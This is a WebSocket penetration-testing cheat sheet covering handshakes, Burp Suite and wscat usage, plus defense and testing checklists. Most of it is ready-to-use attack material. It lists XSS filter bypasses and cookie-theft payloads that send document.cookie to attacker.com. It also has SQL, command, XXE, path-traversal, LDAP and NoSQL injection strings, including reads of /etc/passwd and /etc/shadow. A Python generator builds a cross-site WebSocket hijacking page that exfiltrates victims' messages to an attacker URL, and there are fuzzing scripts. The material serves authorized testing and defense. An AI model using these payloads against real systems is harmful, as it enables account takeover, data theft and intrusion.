# WebSockets Security - Complete Cheat Sheet

**Quick reference for WebSocket penetration testing**

---

## Table of Contents
1. [Basic Concepts](#basic-concepts)
2. [Handshake Headers](#handshake-headers)
3. [Attack Payloads](#attack-payloads)
4. [Burp Suite Commands](#burp-suite-commands)
5. [Tools & Commands](#tools--commands)
6. [Exploitation Scripts](#exploitation-scripts)
7. [Detection & Identification](#detection--identification)
8. [Common Vulnerabilities](#common-vulnerabilities)
9. [Defense Checklist](#defense-checklist)

---

## Basic Concepts

### WebSocket Connection Flow
```
1. Client → HTTP Upgrade Request → Server
2. Server → 101 Switching Protocols → Client
3. Bi-directional messages over persistent connection
4. Either party can close connection
```

### Protocol Comparison
| Protocol | Persistent | Bi-directional | Encrypted | Default Port |
|----------|-----------|----------------|-----------|--------------|
| ws:// | Yes | Yes | No | 80 |
| wss:// | Yes | Yes | Yes (TLS) | 443 |

### Message Formats
```json
// JSON (most common)
{"message": "Hello", "user": "alice"}

// Plain text
READY

// Binary (Base64 encoded)
SGVsbG8gV29ybGQ=
```

---

## Handshake Headers

### Client Request Headers
```http
GET /chat HTTP/1.1
Host: target.com
Connection: keep-alive, Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://target.com
Cookie: session=abc123
```

### Server Response Headers
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Common Custom Headers
```http
Authorization: Bearer <token>
X-Auth-Token: <token>
X-CSRF-Token: <token>
X-Session-ID: <session>
```

---

## Attack Payloads

### XSS Payloads

#### Basic XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
```

#### Obfuscated XSS (Filter Bypass)
```html
<!-- Case variation -->
<img src=x oNeRrOr=alert(1)>
<img src=x OnErRoR=alert(1)>
<svg OnLoAd=alert(1)>
<SCRIPT>alert(1)</SCRIPT>

<!-- Backtick syntax -->
<img src=x onerror=alert`1`>
<img src=x onerror=alert`document.domain`>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Alternative tags -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

<!-- Event handlers -->
<img src=x onload=alert(1)>
<img src=x onmouseover=alert(1)>
<form><button formaction=javascript:alert(1)>X</button></form>
```

#### XSS with Encoding
```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

#### Cookie Theft
```html
<img src=x onerror='fetch("https://attacker.com?c="+document.cookie)'>
<script>fetch("https://attacker.com",{method:"POST",body:document.cookie})</script>
<img src=x onerror='new Image().src="https://attacker.com?c="+document.cookie'>
```

### SQL Injection Payloads

#### Boolean-Based
```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
admin' #
') OR ('1'='1
```

#### UNION-Based
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

#### Time-Based Blind
```sql
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

#### Error-Based
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Command Injection Payloads

#### Unix/Linux
```bash
; ls -la
| whoami
|| cat /etc/passwd
& id
&& uname -a
`whoami`
$(id)
; cat /etc/passwd
| cat /etc/shadow
```

#### Windows
```cmd
& dir
&& ipconfig
| whoami
|| net user
```

#### Time-Based Detection
```bash
; sleep 10
| ping -c 10 127.0.0.1
|| timeout 10
& ping -n 10 127.0.0.1
```

### XXE Payloads

#### File Retrieval
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Out-of-Band XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>
```

### Path Traversal Payloads
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/images/../../../etc/passwd
/etc/passwd%00.png
```

### LDAP Injection Payloads
```
*
*)(&
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
*)(objectClass=*
```

### NoSQL Injection Payloads
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```

---

## Burp Suite Commands

### WebSocket Interception Setup
```
Proxy → Options → WebSocket Interception Rules
☑ Intercept WebSocket messages
  ☑ Client to server
  ☑ Server to client
Filter: URL contains /chat
```

### WebSocket History
```
Location: Proxy → WebSockets history
Columns: # | URL | Direction | Message | Length
Direction: → (outbound) | ← (inbound)
Search: Ctrl+F
Filter: Right-click → Filter WebSockets history
```

### Send to Repeater
```
WebSockets history → Right-click message → Send to Repeater
Or: Ctrl+R (keyboard shortcut)
```

### Repeater Operations
```
Send message: Click "Send" button
Edit handshake: Click pencil icon next to URL
Reconnect: Click "Connect" button
Disconnect: Click "Disconnect" button
Clone tab: Right-click tab → Duplicate tab
```

### Handshake Modification
```
In Repeater:
1. Click pencil icon (or "Edit" button)
2. Add/modify headers:
   X-Forwarded-For: 1.1.1.1
   X-CSRF-Token: custom_token
   Cookie: session=new_session
3. Click "Connect"
```

### Burp Collaborator
```
Location: Burp menu → Burp Collaborator client
Copy URL: Click "Copy to clipboard"
Poll: Click "Poll now" button
Auto-poll: Configure interval in settings
```

### Keyboard Shortcuts
```
Ctrl+R     Send to Repeater
Ctrl+I     Send to Intruder
Ctrl+F     Search
Ctrl+H     WebSocket history
Ctrl+T     New Repeater tab
```

---

## Tools & Commands

### wscat

#### Installation
```bash
npm install -g wscat
```

#### Basic Usage
```bash
# Connect
wscat -c wss://target.com/chat

# With headers
wscat -c wss://target.com/chat -H "Cookie: session=abc123"

# Custom origin
wscat -c wss://target.com/chat -H "Origin: https://trusted.com"

# Send message on connect
wscat -c wss://target.com/chat -x "READY"

# No TLS verification
wscat -c wss://target.com/chat --no-check

# Proxy through Burp
wscat -c wss://target.com/chat --proxy 127.0.0.1:8080
```

#### Interactive Commands
```bash
# In wscat session:
> {"message":"test"}        # Send message
> READY                     # Send command
> <img src=x onerror=alert(1)>  # Send XSS
```

### websocat

#### Installation
```bash
# Linux
wget https://github.com/vi/websocat/releases/download/v1.12.0/websocat.x86_64-unknown-linux-musl
chmod +x websocat.x86_64-unknown-linux-musl
sudo mv websocat.x86_64-unknown-linux-musl /usr/local/bin/websocat

# macOS
brew install websocat
```

#### Usage
```bash
# Connect
websocat wss://target.com/chat

# With headers
websocat wss://target.com/chat --header="Cookie: session=abc"

# Binary mode
websocat -b wss://target.com/binary

# Logging
websocat wss://target.com/chat --log-file=ws.log

# Port forwarding
websocat -v ws-l:127.0.0.1:8080 wss://target.com/chat

# SOCKS proxy
websocat --socks5=127.0.0.1:9050 wss://target.com/chat
```

### Python WebSocket Testing

#### Basic Client
```python
#!/usr/bin/env python3
import asyncio
import websockets

async def test():
    uri = "wss://target.com/chat"
    async with websockets.connect(uri) as ws:
        await ws.send('{"message":"test"}')
        response = await ws.recv()
        print(response)

asyncio.run(test())
```

#### With Headers
```python
import asyncio
import websockets

async def test():
    uri = "wss://target.com/chat"
    headers = {
        "Cookie": "session=abc123",
        "Origin": "https://target.com"
    }
    async with websockets.connect(uri, extra_headers=headers) as ws:
        await ws.send("READY")
        response = await ws.recv()
        print(response)

asyncio.run(test())
```

### JavaScript (Browser Console)

#### Basic Connection
```javascript
var ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
    console.log('[+] Connected');
    ws.send('{"message":"test"}');
};

ws.onmessage = function(event) {
    console.log('[<] Received:', event.data);
};

ws.onerror = function(error) {
    console.error('[!] Error:', error);
};

ws.onclose = function() {
    console.log('[+] Closed');
};
```

#### Send Messages
```javascript
// Send JSON
ws.send(JSON.stringify({message: "test"}));

// Send XSS payload
ws.send(JSON.stringify({message: "<img src=x onerror=alert(1)>"}));

// Send command
ws.send("READY");
```

### cURL (HTTP to WebSocket Upgrade)
```bash
# Test handshake
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.com/chat
```

---

## Exploitation Scripts

### XSS Fuzzer
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<img src=x oNeRrOr=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "';alert(1);//",
    "\"><script>alert(1)</script>",
]

async def fuzz_xss(uri):
    async with websockets.connect(uri) as ws:
        for payload in xss_payloads:
            message = json.dumps({"message": payload})
            await ws.send(message)
            print(f"[*] Sent: {payload}")

            try:
                response = await asyncio.wait_for(ws.recv(), timeout=2.0)
                print(f"[+] Response: {response[:100]}\n")
            except asyncio.TimeoutError:
                print("[!] Connection closed\n")
                break

            await asyncio.sleep(1)

asyncio.run(fuzz_xss("wss://target.com/chat"))
```

### CSWSH Exploit Generator
```python
#!/usr/bin/env python3

def generate_cswsh_exploit(websocket_url, exfil_url):
    exploit = f"""<html>
<head><title>Loading...</title></head>
<body>
<script>
    var ws = new WebSocket('{websocket_url}');

    ws.onopen = function() {{
        console.log('[+] WebSocket connected');
        ws.send("READY");
    }};

    ws.onmessage = function(event) {{
        console.log('[+] Received:', event.data);

        // Exfiltrate data
        fetch('{exfil_url}', {{
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        }});
    }};

    ws.onerror = function(error) {{
        console.log('[!] Error:', error);
    }};
</script>
</body>
</html>"""
    return exploit

# Usage
exploit = generate_cswsh_exploit(
    websocket_url="wss://target.com/chat",
    exfil_url="https://attacker.com/collect"
)

print(exploit)
```

### Automated Testing Framework
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

class WebSocketTester:
    def __init__(self, uri, headers=None):
        self.uri = uri
        self.headers = headers or {}
        self.results = []

    async def test_payload(self, ws, payload_type, payload):
        try:
            message = json.dumps({"message": payload})
            await ws.send(message)
            response = await asyncio.wait_for(ws.recv(), timeout=3.0)
            return {"type": payload_type, "payload": payload, "response": response, "status": "success"}
        except asyncio.TimeoutError:
            return {"type": payload_type, "payload": payload, "response": "Timeout", "status": "timeout"}
        except Exception as e:
            return {"type": payload_type, "payload": payload, "response": str(e), "status": "error"}

    async def run_tests(self, payloads):
        async with websockets.connect(self.uri, extra_headers=self.headers) as ws:
            for payload_type, payload_list in payloads.items():
                print(f"\n[*] Testing {payload_type}...")
                for payload in payload_list:
                    result = await self.test_payload(ws, payload_type, payload)
                    self.results.append(result)
                    print(f"  {result['status']}: {payload[:50]}")
                    await asyncio.sleep(1)

    def print_results(self):
        print("\n" + "="*60)
        print("RESULTS SUMMARY")
        print("="*60)
        for result in self.results:
            if result['status'] == 'success':
                print(f"[+] {result['type']}: {result['payload'][:50]}")

# Usage
payloads = {
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    "SQLi": ["' OR '1'='1", "' UNION SELECT NULL--"],
    "Command": ["; ls -la", "| whoami"]
}

tester = WebSocketTester("wss://target.com/chat", {"Cookie": "session=abc"})
asyncio.run(tester.run_tests(payloads))
tester.print_results()
```

### Bash Fuzzing Script
```bash
#!/bin/bash

WSCAT="wscat -c wss://target.com/chat -H 'Cookie: session=abc'"
PAYLOADS="xss_payloads.txt"

while IFS= read -r payload; do
    echo "[*] Testing: $payload"
    echo "{\"message\":\"$payload\"}" | $WSCAT
    sleep 1
done < "$PAYLOADS"
```

---

## Detection & Identification

### Identify WebSocket Endpoints

#### Browser DevTools
```
1. Open DevTools (F12)
2. Network tab
3. Filter: WS (WebSockets)
4. Observe connections
```

#### Burp Suite
```
Proxy → HTTP history → Filter: WebSocket upgrade
Look for:
  - Upgrade: websocket
  - Connection: Upgrade
  - Sec-WebSocket-Key
```

#### JavaScript Source Code
```javascript
// Search for:
new WebSocket(
WebSocket(
wss://
ws://
```

#### Common WebSocket Paths
```
/ws
/websocket
/socket.io
/chat
/live
/stream
/updates
/notifications
/realtime
```

### Vulnerability Indicators

#### CSWSH Vulnerable
```
✓ Handshake contains only session cookie
✗ No CSRF token
✗ No state parameter
✗ No nonce
✗ No origin validation
```

#### Input Validation Issues
```
✓ User input reflected in messages
✗ No HTML encoding
✗ No input sanitization
✗ No length limits
✗ No character filtering
```

#### Authentication Issues
```
✓ Cookie-only authentication
✗ No token validation
✗ No re-authentication on sensitive actions
✗ Session tokens in URL parameters
```

---

## Common Vulnerabilities

### OWASP WebSocket Security Risks

| Vulnerability | Description | Impact | CVSS |
|--------------|-------------|--------|------|
| **CSWSH** | Missing CSRF protection on handshake | Account takeover, data theft | 8.1 |
| **XSS** | Unvalidated messages injected into DOM | Session hijacking, defacement | 7.5 |
| **SQLi** | Unsanitized input in database queries | Data breach, authentication bypass | 9.8 |
| **Auth Bypass** | Weak or missing authentication | Unauthorized access | 9.1 |
| **Command Injection** | Unsanitized input executed as system commands | RCE, full compromise | 10.0 |

### Real-World CVEs

#### CVE-2024-55591: Node.js WebSocket Auth Bypass
```
Severity: Critical (9.8)
Affected: Node.js ws module, FortiOS, FortiProxy
Exploit: Crafted handshake bypasses authentication
Impact: Privilege escalation to super-admin
```

#### CVE-2018-1270: Spring Framework RCE
```
Severity: Critical (9.8)
Affected: Spring Framework 5.0-5.0.4, 4.3-4.3.14
Exploit: Crafted STOMP messages over WebSocket
Impact: Remote Code Execution
```

#### Gitpod CSWSH (2023)
```
Severity: High (8.1)
Affected: Gitpod cloud platform
Exploit: Missing origin validation + no CSRF token
Impact: Full account takeover
```

---

## Defense Checklist

### Handshake Security
```
□ Implement CSRF tokens in handshake
□ Validate Origin header (whitelist)
□ Require authentication beyond cookies
□ Use state parameters or nonces
□ Validate Sec-WebSocket-Key properly
□ Set SameSite=Strict on cookies
```

### Message Security
```
□ Validate ALL incoming messages
□ Sanitize user input (HTML encode)
□ Use parameterized queries (prevent SQLi)
□ Implement strict input validation
□ Set maximum message size limits
□ Use JSON schema validation
□ Encode output before displaying
```

### Authentication & Authorization
```
□ Authenticate on handshake
□ Re-validate on sensitive actions
□ Implement role-based access control
□ Use token-based auth (not just cookies)
□ Implement session timeout
□ Validate user permissions per action
```

### Network Security
```
□ Use wss:// (encrypted) in production
□ Implement rate limiting (connections & messages)
□ Set connection timeouts
□ Implement ping/pong heartbeat
□ Restrict WebSocket to necessary origins
□ Use Content Security Policy
```

### Monitoring & Logging
```
□ Log all WebSocket connections
□ Log authentication attempts
□ Log suspicious patterns (XSS, SQLi)
□ Implement anomaly detection
□ Alert on rapid connections/messages
□ Store audit trail for security events
```

### Secure Development
```
□ Use security libraries (DOMPurify, OWASP ESAPI)
□ Implement input validation framework
□ Use WebSocket libraries with security focus
□ Keep dependencies updated
□ Conduct security code reviews
□ Perform penetration testing
```

---

## Testing Checklist

### Reconnaissance
```
□ Identify WebSocket endpoints
□ Observe message format
□ Analyze handshake headers
□ Check for CSRF tokens
□ Note authentication mechanism
□ Identify sensitive actions
```

### Message Manipulation
```
□ Test XSS payloads
□ Test SQL injection
□ Test command injection
□ Test path traversal
□ Test XXE injection
□ Test prototype pollution
```

### Handshake Exploitation
```
□ Test IP spoofing (X-Forwarded-For)
□ Test origin bypass (Origin header)
□ Test authentication bypass
□ Test custom headers
□ Test protocol manipulation
```

### CSWSH Testing
```
□ Check for CSRF tokens in handshake
□ Validate origin checking
□ Create CSWSH proof-of-concept
□ Test data exfiltration
□ Test unauthorized actions
□ Verify impact on real users
```

### Authorization Testing
```
□ Test vertical privilege escalation
□ Test horizontal privilege escalation
□ Test IDOR vulnerabilities
□ Test role-based access controls
□ Test action-level authorization
```

### DoS Testing
```
□ Test connection exhaustion
□ Test message flood
□ Test large message sizes
□ Test rapid reconnection
□ Test resource consumption
```

---

## Quick Reference Tables

### WebSocket Event Handlers
| Event | Description | Usage |
|-------|-------------|-------|
| `onopen` | Connection established | Send initial messages |
| `onmessage` | Message received | Process incoming data |
| `onerror` | Error occurred | Handle connection errors |
| `onclose` | Connection closed | Cleanup, reconnect |

### HTTP Status Codes
| Code | Meaning | Context |
|------|---------|---------|
| 101 | Switching Protocols | Successful WebSocket upgrade |
| 400 | Bad Request | Invalid handshake |
| 401 | Unauthorized | Authentication failed |
| 403 | Forbidden | Access denied |
| 426 | Upgrade Required | Missing Upgrade header |

### WebSocket Close Codes
| Code | Meaning | Description |
|------|---------|-------------|
| 1000 | Normal Closure | Connection closed normally |
| 1001 | Going Away | Server/client going offline |
| 1002 | Protocol Error | Protocol violation |
| 1003 | Unsupported Data | Received unsupported data type |
| 1006 | Abnormal Closure | Connection lost without close frame |
| 1007 | Invalid Data | Received inconsistent data |
| 1008 | Policy Violation | Generic policy violation |
| 1009 | Message Too Big | Message exceeds size limit |
| 1011 | Internal Error | Server encountered error |

### Common Ports
| Port | Protocol | Usage |
|------|----------|-------|
| 80 | ws:// | Unencrypted WebSocket |
| 443 | wss:// | Encrypted WebSocket (TLS) |
| 8080 | ws:// | Development/proxy |
| 3000 | ws:// | Node.js default |

---

## Resources

### Official Documentation
- [RFC 6455 - WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [wscat](https://github.com/websockets/wscat)
- [websocat](https://github.com/vi/websocat)
- [SocketSleuth](https://github.com/snyk/socketsleuth)

### Learning Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/websockets)
- [HackTricks - WebSockets](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)
- [PayloadsAllTheThings - WebSockets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/WebSockets%20Attacks/README.md)

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Quick Access:** Print this cheat sheet for rapid reference during penetration testing engagements
